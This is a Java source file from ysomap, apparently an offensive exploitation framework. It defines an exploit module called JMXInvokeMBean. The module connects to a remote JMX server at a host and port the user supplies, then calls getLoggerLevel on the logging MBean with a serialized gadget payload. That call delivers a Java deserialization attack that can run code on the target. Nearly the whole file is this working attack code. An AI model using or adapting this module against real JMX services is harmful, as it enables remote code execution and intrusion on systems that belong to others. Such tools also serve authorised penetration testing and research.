package ysomap.core.exploit.jmx;

import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Exploits;
import ysomap.annotation.Require;
import ysomap.core.bean.Exploit;
import ysomap.util.Logger;

import javax.management.*;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import java.io.IOException;
import java.net.MalformedURLException;

/**
 * @author wh1t3P1g
 * @since 2020/3/4
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {"all gadgets"})
@Dependencies({"need set a gadget to return"})
public class JMXInvokeMBean extends Exploit {

    @Require(name = "rhost",detail = "remote JMX server host")
    public String rhost;

    @Require(name = "rport", type = "int", detail = "remote JMX server port")
    public String rport;

    private Object payload;
    private String payloadName;

    @Override
    public void run() {
        JMXServiceURL url = null;
        try {
            url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + rhost + ":" + rport + "/jmxrmi");
            JMXConnector jmxConnector = JMXConnectorFactory.connect(url);
            MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();

            ObjectName mbeanName = new ObjectName("java.util.logging:type=Logging");

            mbeanServerConnection.invoke(mbeanName, "getLoggerLevel", new Object[]{payload}, new String[]{String.class.getCanonicalName()});

            //close the connection
            jmxConnector.close();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ReflectionException e) {
            e.printStackTrace();
        } catch (InstanceNotFoundException e) {
            e.printStackTrace();
        } catch (MBeanException e) {
            e.printStackTrace();
        } catch (MalformedObjectNameException e) {
            e.printStackTrace();
        }

        exit = true;
        Logger.success(this+" done!");
    }

    @Override
    public String toString() {
        return "JMXInvokeMBean{" +
                "rhost='" + rhost + '\'' +
                ", rport='" + rport + '\'' +
                ", payloadName='" + payloadName + '\'' +
                '}';
    }
}
